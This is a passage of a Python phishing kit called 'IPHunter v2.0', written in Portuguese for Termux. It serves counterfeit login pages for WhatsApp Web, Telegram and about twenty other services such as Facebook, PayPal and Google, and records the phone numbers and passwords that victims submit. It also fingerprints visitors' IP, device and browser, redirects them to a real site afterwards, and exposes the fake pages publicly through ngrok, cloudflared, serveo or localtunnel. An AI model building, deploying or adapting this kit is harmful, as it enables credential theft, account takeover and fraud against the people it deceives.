.sub{color:#667781;font-size:1rem;margin-bottom:32px}
.qr-box{width:200px;height:200px;background:#fff;border:1px solid #e9edef;border-radius:8px;margin:0 auto 24px;padding:16px;display:flex;align-items:center;justify-content:center}
.qr-box svg{width:100%;height:100%}
.inp{width:100%;padding:14px 16px;margin:8px 0;border:1px solid #e9edef;border-radius:8px;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#25d366;box-shadow:0 0 0 3px rgba(37,211,102,0.1)}
.inp::placeholder{color:#667781}
.btn{width:100%;padding:14px;margin:16px 0;background:#25d366;color:#fff;border:none;border-radius:24px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .15s}
.btn:hover{background:#128c7e}
.forgot{color:#25d366;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="32" r="30" fill="#25d366"/><path d="M32 16c-8.8 0-16 7.2-16 16 0 2.8.7 5.5 2.1 7.9l-1.4 5.1 5.2-1.4c2.2 1.2 4.7 1.8 7.1 1.8 8.8 0 16-7.2 16-16S40.8 16 32 16zm0 28c-2.1 0-4.1-.5-5.9-1.5l-.4-.2-3.5.9.9-3.4-.3-.4c-1-1.6-1.5-3.5-1.5-5.4 0-6.6 5.4-12 12-12s12 5.4 12 12-5.4 12-12 12z" fill="#fff"/><path d="M28 24c-.6 0-1.1.2-1.5.6-.4.4-.6.9-.6 1.5 0 .6.2 1.1.6 1.5.4.4.9.6 1.5.6s1.1-.2 1.5-.6c.4-.4.6-.9.6-1.5 0-.6-.2-1.1-.6-1.5-.4-.4-.9-.6-1.5-.6zm8 0c-.6 0-1.1.2-1.5.6-.4.4-.6.9-.6 1.5 0 .6.2 1.1.6 1.5.4.4.9.6 1.5.6s1.1-.2 1.5-.6c.4-.4.6-.9.6-1.5 0-.6-.2-1.1-.6-1.5-.4-.4-.9-.6-1.5-.6zm-4 12c-2.2 0-4.1-.8-5.6-2.3l-1.4 1.4c1.9 1.9 4.4 3 7 3 2.6 0 5.1-1.1 7-3l-1.4-1.4c-1.5 1.5-3.4 2.3-5.6 2.3z" fill="#fff"/></svg></div>
<h1>WhatsApp Web</h1>
<p class="sub">Use o WhatsApp no seu computador</p>
<div class="qr-box"><svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"><rect x="20" y="20" width="60" height="60" fill="#111b21"/><rect x="120" y="20" width="60" height="60" fill="#111b21"/><rect x="20" y="120" width="60" height="60" fill="#111b21"/><rect x="100" y="100" width="20" height="20" fill="#111b21"/><rect x="140" y="100" width="20" height="20" fill="#111b21"/><rect x="100" y="140" width="20" height="20" fill="#111b21"/><rect x="160" y="140" width="20" height="20" fill="#111b21"/></svg></div>
<p style="color:#667781;font-size:.9rem;margin-bottom:16px">Ou digite seu numero de telefone</p>
<form action="/capture" method="POST">
<input type="tel" name="phone" class="inp" placeholder="+55 (XX) XXXXX-XXXX" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Conectar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
</div></body></html>"""


TELEGRAM_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram Web</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#17212b;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;padding:20px}
.card{width:100%;max-width:360px;padding:40px;text-align:center}
.logo{margin-bottom:24px}
.logo svg{width:80px;height:80px}
h1{font-size:1.5rem;font-weight:700;margin-bottom:8px}
.sub{color:#7f91a4;font-size:1rem;margin-bottom:32px}
.inp{width:100%;padding:14px 16px;margin:8px 0;background:#242f3d;border:1px solid #242f3d;border-radius:8px;color:#fff;font-size:1rem;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#2b9fd6;box-shadow:0 0 0 3px rgba(43,159,214,0.1)}
.inp::placeholder{color:#7f91a4}
.btn{width:100%;padding:14px;margin:16px 0;background:#2b9fd6;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:background .15s}
.btn:hover{background:#1a8bc4}
.forgot{color:#2b9fd6;font-size:.9rem;margin:12px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{color:#7f91a4;font-size:.9rem;margin-top:24px}
.signup a{color:#2b9fd6;text-decoration:none;font-weight:600}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg"><circle cx="40" cy="40" r="38" fill="#2b9fd6"/><path d="M18 40l28-12 12 28-28-12z" fill="#fff"/><path d="M35 40l5-2 8 4-5 2z" fill="#2b9fd6"/></svg></div>
<h1>Entrar no Telegram</h1>
<p class="sub">A mensagem mais rapida e segura</p>
<form action="/capture" method="POST">
<input type="tel" name="phone" class="inp" placeholder="Numero de telefone" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu sua senha?</div>
<div class="signup">Novo no Telegram? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


# ============================================================
#  CONFIGURACAO DOS SITES
# ============================================================
SITES = {
    '01': ('IP Logger (Site Vazio)', EMPTY_TEMPLATE),
    '02': ('Facebook', FACEBOOK_TEMPLATE),
    '03': ('Instagram', INSTAGRAM_TEMPLATE),
    '04': ('Google', GOOGLE_TEMPLATE),
    '05': ('Netflix', NETFLIX_TEMPLATE),
    '06': ('Microsoft', MICROSOFT_TEMPLATE),
    '07': ('Twitter/X', TWITTER_TEMPLATE),
    '08': ('PayPal', PAYPAL_TEMPLATE),
    '09': ('TikTok', TIKTOK_TEMPLATE),
    '10': ('Spotify', SPOTIFY_TEMPLATE),
    '11': ('Discord', DISCORD_TEMPLATE),
    '12': ('Snapchat', SNAPCHAT_TEMPLATE),
    '13': ('LinkedIn', LINKEDIN_TEMPLATE),
    '14': ('Twitch', TWITCH_TEMPLATE),
    '15': ('Steam', STEAM_TEMPLATE),
    '16': ('Pinterest', PINTEREST_TEMPLATE),
    '17': ('Reddit', REDDIT_TEMPLATE),
    '18': ('GitHub', GITHUB_TEMPLATE),
    '19': ('WhatsApp Web', WHATSAPP_TEMPLATE),
    '20': ('Telegram Web', TELEGRAM_TEMPLATE),
}

# ============================================================
#  VARIAVEIS GLOBAIS
# ============================================================
captured_data = []
ip_logs = []
server_running = False
httpd = None
server_thread = None
current_template = ""
redirect_url = "https://google.com"

# ============================================================
#  FUNCOES UTILITARIAS
# ============================================================
def clear():
    os.system('clear')


def print_header(title):
    print()
    print(C.CYAN + "╔" + "═" * 58 + "╗" + C.RESET)
    padding = (58 - len(title)) // 2
    print(C.CYAN + "║" + C.RESET + " " * padding + C.BRIGHT_CYAN + C.BOLD + title + C.RESET + " " * (58 - len(title) - padding) + C.CYAN + "║" + C.RESET)
    print(C.CYAN + "╚" + "═" * 58 + "╝" + C.RESET)
    print()


def print_section(title):
    print()
    print(C.BRIGHT_BLUE + "┌" + "─" * 58 + "┐" + C.RESET)
    padding = (58 - len(title)) // 2
    print(C.BRIGHT_BLUE + "│" + C.RESET + " " * padding + C.BRIGHT_WHITE + C.BOLD + title + C.RESET + " " * (58 - len(title) - padding) + C.BRIGHT_BLUE + "│" + C.RESET)
    print(C.BRIGHT_BLUE + "└" + "─" * 58 + "┘" + C.RESET)
    print()


def print_info(text):
    print(f"    {C.CYAN}ℹ {text}{C.RESET}")


def print_ok(text):
    print(f"    {C.GREEN}✓ {text}{C.RESET}")


def print_error(text):
    print(f"    {C.RED}✗ {text}{C.RESET}")


def print_found(text, level="warning"):
    if level == "critical":
        icon = C.BRIGHT_RED + "🔴" + C.RESET
        color = C.BRIGHT_RED
    elif level == "high":
        icon = C.RED + "⚠️ " + C.RESET
        color = C.RED
    else:
        icon = C.YELLOW + "⚠️ " + C.RESET
        color = C.YELLOW
    print(f"    {icon} {color}{text}{C.RESET}")


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


# ============================================================
#  NGROK - CORRIGIDO PARA TERMUX
# ============================================================
def check_ngrok():
    """Verifica se ngrok esta instalado em varios locais possiveis"""
    try:
        result = subprocess.run(['which', 'ngrok'], capture_output=True, text=True)
        if result.returncode == 0:
            return True
    except:
        pass

    # Caminhos comuns no Termux e Linux
    ngrok_paths = [
        '/data/data/com.termux/files/usr/bin/ngrok',
        '/data/data/com.termux/files/usr/local/bin/ngrok',
        '/usr/local/bin/ngrok',
        '/usr/bin/ngrok',
        os.path.expanduser('~/ngrok'),
        os.path.expanduser('~/.local/bin/ngrok'),
        './ngrok',
        'ngrok',
    ]
    for path in ngrok_paths:
        if os.path.exists(path) and os.access(path, os.X_OK):
            return True
    return False


def install_ngrok():
    """Instala ngrok automaticamente no Termux"""
    print_info("Ngrok nao encontrado. Tentando instalar...")

    try:
        arch = subprocess.run(['uname', '-m'], capture_output=True, text=True).stdout.strip()
    except:
        arch = "unknown"

    print_info(f"Arquitetura detectada: {arch}")

    # Detectar arquitetura correta
    if 'aarch64' in arch or 'arm64' in arch:
        ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
        arch_name = "arm64"
    elif 'arm' in arch:
        ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz"
        arch_name = "arm"
    else:
        ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
        arch_name = "amd64"

    print_info(f"Baixando ngrok para {arch_name}...")

    # Tentar instalar em varios locais
    install_dirs = [
        '/data/data/com.termux/files/usr/bin',
        '/data/data/com.termux/files/usr/local/bin',
        os.path.expanduser('~/.local/bin'),
        os.path.expanduser('~'),
    ]

    # Baixar para /tmp primeiro
    tmp_tar = '/tmp/ngrok_install.tgz'
    os.system(f"wget -q --show-progress '{ngrok_url}' -O {tmp_tar} 2>/dev/null || curl -sL '{ngrok_url}' -o {tmp_tar}")

    if not os.path.exists(tmp_tar) or os.path.getsize(tmp_tar) < 1000:
        print_error("Falha ao baixar ngrok. Verifique sua conexao.")
        print_info("Tente instalar manualmente:")
        print_info("  pkg install wget curl")
        print_info("  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz")
        print_info("  tar -xzf ngrok-v3-stable-linux-arm64.tgz -C $PREFIX/bin/")
        return False

    # Extrair para cada diretorio ate conseguir
    installed = False
    for install_dir in install_dirs:
        try:
            os.makedirs(install_dir, exist_ok=True)
            result = os.system(f"tar -xzf {tmp_tar} -C {install_dir} 2>/dev/null")
            ngrok_path = os.path.join(install_dir, 'ngrok')
            if os.path.exists(ngrok_path):
                os.chmod(ngrok_path, 0o755)
                # Verificar se eh executavel
                test = subprocess.run([ngrok_path, 'version'], capture_output=True, text=True)
                if test.returncode == 0:
                    print_ok(f"Ngrok instalado em: {ngrok_path}")
                    installed = True
                    break
        except Exception as e:
            continue

    # Limpar arquivo temporario
    try:
        os.remove(tmp_tar)
    except:
        pass

    if not installed:
        print_error("Nao foi possivel instalar ngrok automaticamente.")
        print_info("Instale manualmente:")
        print_info("  1. Va em https://dashboard.ngrok.com/get-started/setup/linux")
        print_info("  2. Baixe a versao para sua arquitetura")
        print_info("  3. Extraia para $PREFIX/bin/")
        return False

    return True


def start_ngrok(port):
    """Inicia o tunel ngrok"""
    print_info("Iniciando ngrok...")
    os.system("pkill -f 'ngrok http' 2>/dev/null")
    time.sleep(1)

    # Tentar encontrar o executavel ngrok
    ngrok_cmd = 'ngrok'
    for path in ['/data/data/com.termux/files/usr/bin/ngrok', '/usr/local/bin/ngrok', os.path.expanduser('~/.local/bin/ngrok')]:
        if os.path.exists(path):
            ngrok_cmd = path
            break

    os.system(f"{ngrok_cmd} http {port} --log=stdout > /tmp/ngrok.log 2>&1 &")
    time.sleep(5)

    for _ in range(15):
        try:
            result = subprocess.run(['curl', '-s', 'http://127.0.0.1:4040/api/tunnels'],
                                    capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout)
                if data.get('tunnels'):
                    url = data['tunnels'][0]['public_url']
                    print_ok(f"Tunel ativo: {url}")
                    return url
        except Exception as e:
            pass
        time.sleep(1)

    print_error("Ngrok nao conseguiu criar o tunel.")
    print_info("Verifique se voce configurou o authtoken:")
    print_info("  ngrok config add-authtoken SEU_TOKEN")
    print_info("  (pegue em https://dashboard.ngrok.com)")
    return None


def start_cloudflared(port):
    print_info("Iniciando Cloudflared...")
    try:
        result = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
        if result.returncode != 0:
            print_error("Cloudflared nao encontrado")
            print_info("Instale com: pkg install cloudflared")
            return None
    except:
        return None
    os.system("pkill -f 'cloudflared tunnel' 2>/dev/null")
    time.sleep(1)
    os.system(f"cloudflared tunnel --url http://localhost:{port} > /tmp/cloudflared.log 2>&1 &")
    time.sleep(5)
    for _ in range(15):
        try:
            with open('/tmp/cloudflared.log', 'r') as fh:
                log = fh.read()
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', log)
            if match:
                return match.group(0)
        except:
            pass
        time.sleep(1)
    return None


def start_serveo(port):
    print_info("Iniciando Serveo (SSH tunnel)...")
    os.system("pkill -f 'serveo.net' 2>/dev/null")
    time.sleep(1)
    os.system(f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net > /tmp/serveo.log 2>&1 &")
    time.sleep(6)
    for _ in range(10):
        try:
            with open('/tmp/serveo.log', 'r') as fh:
                log = fh.read()
            match = re.search(r'https?://[a-zA-Z0-9-]+\.serveo\.net', log)
            if match:
                return match.group(0)
        except:
            pass
        time.sleep(1)
    return None


def start_localtunnel(port):
    print_info("Iniciando LocalTunnel...")
    try:
        result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
        if result.returncode != 0:
            print_error("LocalTunnel (lt) nao encontrado")
            print_info("Instale com: npm install -g localtunnel")
            return None
    except:
        return None
    os.system("pkill -f 'lt --port' 2>/dev/null")
    time.sleep(1)
    os.system(f"lt --port {port} > /tmp/localtunnel.log 2>&1 &")
    time.sleep(5)
    for _ in range(10):
        try:
            with open('/tmp/localtunnel.log', 'r') as fh:
                log = fh.read()
            match = re.search(r'https?://[a-zA-Z0-9-]+\.loca\.lt', log)
            if match:
                return match.group(0)
        except:
            pass
        time.sleep(1)
    return None


# ============================================================
#  SERVIDOR HTTP COM IP LOGGER + PORTA
# ============================================================
class IPLoggerHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global captured_data, ip_logs
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        referer = self.headers.get('Referer', 'Direct')

        if path == '/log':
            ip = query.get('ip', [client_ip])[0]
            port = query.get('port', ['unknown'])[0]
            ua = query.get('ua', [user_agent])[0]
            ref = query.get('ref', [referer])[0]
            lang = query.get('lang', ['Unknown'])[0]
            plat = query.get('plat', ['Unknown'])[0]
            screen = query.get('screen', ['Unknown'])[0]
            tz = query.get('tz', ['Unknown'])[0]
            battery = query.get('battery', ['unknown'])[0]
            cores = query.get('cores', ['unknown'])[0]
            memory = query.get('memory', ['unknown'])[0]

            log_entry = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': ip,
                'port': port,
                'user_agent': ua,
                'referer': ref,
                'language': lang,
                'platform': plat,
                'screen': screen,
                'timezone': tz,
                'battery': battery,
                'cores': cores,
                'memory': memory,
                'type': 'ip_logger'
            }
            ip_logs.append(log_entry)

            print()
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print(C.BRIGHT_GREEN + C.BOLD + "           🎯 NOVO ALVO CAPTURADO!" + C.RESET)
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print(f"    {C.YELLOW}📍 IP:{C.RESET}          {C.BRIGHT_WHITE}{ip}{C.RESET}")
            print(f"    {C.YELLOW}🔌 Porta:{C.RESET}       {C.BRIGHT_WHITE}{port}{C.RESET}")
            print(f"    {C.YELLOW}🕐 Horario:{C.RESET}     {C.BRIGHT_WHITE}{log_entry['timestamp']}{C.RESET}")
            print(f"    {C.YELLOW}🖥️  Tela:{C.RESET}       {C.BRIGHT_WHITE}{screen}{C.RESET}")
            print(f"    {C.YELLOW}🌍 Timezone:{C.RESET}    {C.BRIGHT_WHITE}{tz}{C.RESET}")
            print(f"    {C.YELLOW}🌐 User-Agent:{C.RESET} {C.DIM}{ua[:60]}{C.RESET}")
            print(f"    {C.YELLOW}🔗 Referer:{C.RESET}    {C.DIM}{ref[:50]}{C.RESET}")
            print(f"    {C.YELLOW}🗣️  Idioma:{C.RESET}     {C.BRIGHT_WHITE}{lang}{C.RESET}")
            print(f"    {C.YELLOW}💻 Plataforma:{C.RESET} {C.BRIGHT_WHITE}{plat}{C.RESET}")
            print(f"    {C.YELLOW}🔋 Bateria:{C.RESET}    {C.BRIGHT_WHITE}{battery}{C.RESET}")
            print(f"    {C.YELLOW}⚙️  Cores:{C.RESET}      {C.BRIGHT_WHITE}{cores}{C.RESET}")
            print(f"    {C.YELLOW}💾 Memoria:{C.RESET}    {C.BRIGHT_WHITE}{memory} GB{C.RESET}")
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print()

            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
            return

        if path in ['/', '/index.html']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(current_template.encode('utf-8'))
            return

        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>404 Not Found</h1>')

    def do_POST(self):
        global captured_data
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)

        capture = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': client_ip,
            'user_agent': user_agent,
            'data': {k: v[0] if v else '' for k, v in form_data.items()},
            'type': 'credentials'
        }
        captured_data.append(capture)

        print()
        print(C.BRIGHT_RED + "═" * 60 + C.RESET)
        print(C.BRIGHT_RED + C.BOLD + "           🔥 CREDENCIAIS CAPTURADAS!" + C.RESET)
        print(C.BRIGHT_RED + "═" * 60 + C.RESET)
        print(f"    {C.YELLOW}📍 IP:{C.RESET}          {C.BRIGHT_WHITE}{client_ip}{C.RESET}")
        print(f"    {C.YELLOW}🕐 Horario:{C.RESET}     {C.BRIGHT_WHITE}{capture['timestamp']}{C.RESET}")
        for key, value in capture['data'].items():
            print(f"    {C.YELLOW}🔑 {key}:{C.RESET}      {C.BRIGHT_WHITE}{value}{C.RESET}")
        print(C.BRIGHT_RED + "═" * 60 + C.RESET)
        print()

        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()


def start_server(port, template, redirect):
    global current_template, redirect_url, httpd, server_running
    current_template = template
    redirect_url = redirect
    handler = IPLoggerHandler
    try:
        httpd = socketserver.TCPServer(("", port), handler)
        server_running = True
        print_ok(f"Servidor iniciado na porta {port}")
        httpd.serve_forever()
    except OSError as e:
        print_error(f"Erro ao iniciar servidor: {e}")
        server_running = False


def stop_server():
    global httpd, server_running
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        server_running = False
        print_ok("Servidor parado")


# ============================================================
#  MENU PRINCIPAL - COM ESPACAMENTO MAIOR
# ============================================================
def show_banner():
    clear()
    print()
    print(BANNER)
    print()
    print(C.BRIGHT_CYAN + C.BOLD + "           IPHunter v2.0 - IP Logger & Phishing Tool" + C.RESET)
    print(C.DIM + "           Criado para Termux | Use com responsabilidade" + C.RESET)
    print()


def show_menu():
    print_section("ESCOLHA O SITE")

    # Layout em 3 colunas com MAIS ESPACO entre elas
    # Cada coluna: [XX] Nome (largura ~28 chars)

    col1 = [
        ('01', 'IP Logger (Vazio)'),
        ('02', 'Facebook'),
        ('03', 'Instagram'),
        ('04', 'Google'),
        ('05', 'Netflix'),
        ('06', 'Microsoft'),
        ('07', 'Twitter/X'),
    ]
    col2 = [
        ('08', 'PayPal'),
        ('09', 'TikTok'),
        ('10', 'Spotify'),
        ('11', 'Discord'),
        ('12', 'Snapchat'),
        ('13', 'LinkedIn'),
        ('14', 'Twitch'),
    ]
    col3 = [
        ('15', 'Steam'),
        ('16', 'Pinterest'),
        ('17', 'Reddit'),
        ('18', 'GitHub'),
        ('19', 'WhatsApp'),
        ('20', 'Telegram'),
    ]

    max_rows = max(len(col1), len(col2), len(col3))

    for i in range(max_rows):
        parts = []

        # Coluna 1
        if i < len(col1):
            num, name = col1[i]
            parts.append(f"{C.BRIGHT_RED}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name:<20}{C.RESET}")
        else:
            parts.append(" " * 28)

        # Coluna 2
        if i < len(col2):
            num, name = col2[i]
            parts.append(f"{C.BRIGHT_BLUE}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name:<20}{C.RESET}")
        else:
            parts.append(" " * 28)

        # Coluna 3
        if i < len(col3):
            num, name = col3[i]
            parts.append(f"{C.BRIGHT_GREEN}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name}{C.RESET}")
        else:
            parts.append("")

        # Unir com espacamento entre colunas
        line = "    " + "    ".join(parts)
        print(line)

    print()
    print(f"    {C.BRIGHT_YELLOW}{C.BOLD}[99]{C.RESET} {C.BRIGHT_RED}Sair{C.RESET}")
    print()
    print(f"    {C.CYAN}➤ Escolha uma opcao:{C.RESET}", end=" ")


def show_tunnel_menu():
    print_section("ESCOLHA O TUNEL")
    print(f"    {C.BRIGHT_GREEN}{C.BOLD}[1]{C.RESET} {C.WHITE}Ngrok (Recomendado){C.RESET}")
    print(f"    {C.BRIGHT_BLUE}{C.BOLD}[2]{C.RESET} {C.WHITE}Cloudflared{C.RESET}")
    print(f"    {C.BRIGHT_YELLOW}{C.BOLD}[3]{C.RESET} {C.WHITE}Serveo (SSH){C.RESET}")
    print(f"    {C.BRIGHT_MAGENTA}{C.BOLD}[4]{C.RESET} {C.WHITE}LocalTunnel{C.RESET}")
    print(f"    {C.BRIGHT_WHITE}{C.BOLD}[5]{C.RESET} {C.WHITE}Apenas Localhost{C.RESET}")
    print()
    print(f"    {C.CYAN}➤ Escolha:{C.RESET}", end=" ")


def show_results():
    print_section("RESULTADOS CAPTURADOS")
    print(f"    {C.BRIGHT_CYAN}{C.BOLD}📍 IPs CAPTURADOS ({len(ip_logs)}):{C.RESET}")
    if ip_logs:
        for i, log in enumerate(ip_logs[-10:], 1):
            print(f"    {C.YELLOW}[{i}]{C.RESET} {C.BRIGHT_WHITE}{log['ip']}{C.RESET} {C.DIM}(Porta: {log.get('port', 'N/A')}){C.RESET} - {C.DIM}{log['timestamp']}{C.RESET}")
            print(f"         {C.DIM}Tela: {log.get('screen', 'N/A')} | TZ: {log.get('timezone', 'N/A')} | UA: {log['user_agent'][:40]}{C.RESET}")
    else:
        print(f"    {C.DIM}Nenhum IP capturado ainda{C.RESET}")
    print()
    print(f"    {C.BRIGHT_RED}{C.BOLD}🔑 CREDENCIAIS CAPTURADAS ({len(captured_data)}):{C.RESET}")
    if captured_data:
        for i, cap in enumerate(captured_data[-10:], 1):
            print(f"    {C.YELLOW}[{i}]{C.RESET} {C.BRIGHT_WHITE}{cap['ip']}{C.RESET} - {C.DIM}{cap['timestamp']}{C.RESET}")
            for k, v in cap['data'].items():
                print(f"         {C.YELLOW}{k}:{C.RESET} {C.BRIGHT_WHITE}{v}{C.RESET}")
    else:
        print(f"    {C.DIM}Nenhuma credencial capturada ainda{C.RESET}")
    print()


def save_results():
    if not captured_data and not ip_logs:
        print_error("Nenhum dado para salvar!")
        return
    filename = f"iphunter_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip_logs': ip_logs,
        'credentials': captured_data
    }
    try:
        with open(filename, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
        print_ok(f"Resultados salvos em: {filename}")
    except Exception as e:
        print_error(f"Erro ao salvar: {e}")


# ============================================================
#  FUNCAO MAIN
# ============================================================
def main():
    global server_running, server_thread

    while True:
        show_banner()
        show_menu()

        try:
            choice = input().strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if choice == '99':
            if server_running:
                stop_server()
            clear()
            print()
            print_header("Obrigado por usar o IPHunter v2.0!")
            print()
            break

        if choice not in SITES:
            print(f"\n    {C.RED}✗ Opcao invalida!{C.RESET}")
            time.sleep(1)
            continue

        site_name, template = SITES[choice]

        # Escolher tunel
        clear()
        show_banner()
        show_tunnel_menu()

        try:
            tunnel_choice = input().strip()
        except (EOFError, KeyboardInterrupt):
            continue

        # Escolher porta
        print()
        print(f"    {C.CYAN}➤ Digite a porta (padrao 8080):{C.RESET}", end=" ")
        try:
            port_input = input().strip()
            port = int(port_input) if port_input else 8080
        except:
            port = 8080

        # Escolher URL de redirecionamento
        print(f"    {C.CYAN}➤ URL de redirecionamento apos captura (padrao: google.com):{C.RESET}", end=" ")
        try:
            redirect = input().strip()
            if not redirect.startswith('http'):
                redirect = 'https://' + redirect if redirect else 'https://google.com'
        except:
            redirect = 'https://google.com'

        # Iniciar servidor
        clear()
        show_banner()
        print_header(f"INICIANDO: {site_name}")

        server_thread = threading.Thread(target=start_server, args=(port, template, redirect))
        server_thread.daemon = True
        server_thread.start()
        time.sleep(1)

        if not server_running:
            print_error("Falha ao iniciar servidor!")
            time.sleep(2)
            continue

        local_ip = get_local_ip()
        print_ok(f"Servidor local: http://{local_ip}:{port}")
        print()

        # Iniciar tunel
        public_url = None
        if tunnel_choice == '1':
            if not check_ngrok():
                install_ngrok()
            if check_ngrok():
                public_url = start_ngrok(port)
        elif tunnel_choice == '2':
            public_url = start_cloudflared(port)
        elif tunnel_choice == '3':
            public_url = start_serveo(port)
        elif tunnel_choice == '4':
            public_url = start_localtunnel(port)

        print()
        if public_url:
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print(C.BRIGHT_GREEN + C.BOLD + "           🌐 LINK PUBLICO:" + C.RESET)
            print()
            print(f"    {C.BRIGHT_WHITE}{C.BOLD}{public_url}{C.RESET}")
            print()
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
        else:
            print(C.YELLOW + "═" * 60 + C.RESET)
            print(C.YELLOW + "    ⚠️  Nenhum tunel publico disponivel" + C.RESET)
            print(C.YELLOW + "    Use o link local acima (mesma rede WiFi)" + C.RESET)
            print(C.YELLOW + "═" * 60 + C.RESET)

        print()
        print(f"    {C.BRIGHT_CYAN}{C.BOLD}🎯 Aguardando vitimas...{C.RESET}")
        print(f"    {C.DIM}Pressione ENTER para parar o servidor e ver resultados{C.RESET}")
        print()

        try:
            input()
        except (EOFError, KeyboardInterrupt):
            pass

        stop_server()
        time.sleep(0.5)

        # Mostrar resultados
        clear()
        show_banner()
        show_results()

        print(f"    {C.CYAN}➤ Deseja salvar os resultados? (s/n):{C.RESET}", end=" ")
        try:
            save_choice = input().strip().lower()
            if save_choice == 's':
                save_results()
        except:
            pass

        print()
        print(f"    {C.CYAN}➤ Pressione ENTER para voltar ao menu...{C.RESET}")
        try:
            input()
        except:
            pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if server_running:
            stop_server()
        clear()
        print()
        print_header("IPHunter v2.0 encerrado pelo usuario.")
        print()
    except Exception as e:
        clear()
        print()
        print_header(f"ERRO: {str(e)[:40]}")
        print()
